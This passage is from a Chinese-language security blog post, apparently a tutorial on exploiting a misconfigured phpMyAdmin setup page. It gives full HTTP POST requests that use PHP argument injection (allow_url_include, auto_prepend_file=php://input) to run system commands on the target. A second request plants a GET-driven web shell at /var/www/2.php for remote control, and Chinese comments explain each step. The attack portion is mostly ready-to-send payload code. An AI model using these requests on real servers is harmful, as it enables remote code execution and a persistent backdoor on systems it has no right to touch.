+<pre><code>POST http://www.0-sec.org/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1      
+ #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码
+
+Host: www.0-sec.org 
+
+Content-Length: 35
+
+&lt;?php 
+
+passthru(&#39;id&#39;);        
+ #passthru() 函数用于调用系统命令，并把命令的运行结果原样地直接输出到标准输出设备上。
+ #也可以将id命令换成其他Linux命令去获取web系统的数据,目前使用的是普通用户www-date,权限有限
+
+die();                
+ #die() 函数输出一条消息，并退出当前脚本,此处使用为了避免获取多余无用的信息
+
+?&gt;
+</code></pre>
+<p>可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息<img src="/resource/Phpmyadminsetup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/media/rId25.png" alt="3.png">由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果<img src="/resource/Phpmyadminsetup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/media/rId26.png" alt="4.png"><img src="/resource/Phpmyadminsetup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/media/rId27.png" alt="5.png">命令如下</p>
+<pre><code>POST http://www.0-sec.org/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host: www.0-sec.org
+Content-Length: 102
+
+&lt;?php 
+
+passthru(&#39;echo &quot;&lt;?php \$cmd = \$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt;/var/www/2.php&#39;);
+#该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令
+#反斜杠作用:避免服务器将上传内容过滤,输入命令无效
+die();
+
+?&gt;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" data-id="cl5c2quao00e9y8v134md0sj0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/49/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/48/">48</a><a class="page-number" href="/page/49/">49</a><span class="page-number current">50</span><a class="page-number" href="/page/51/">51</a><a class="page-number" href="/page/52/">52</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/51/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
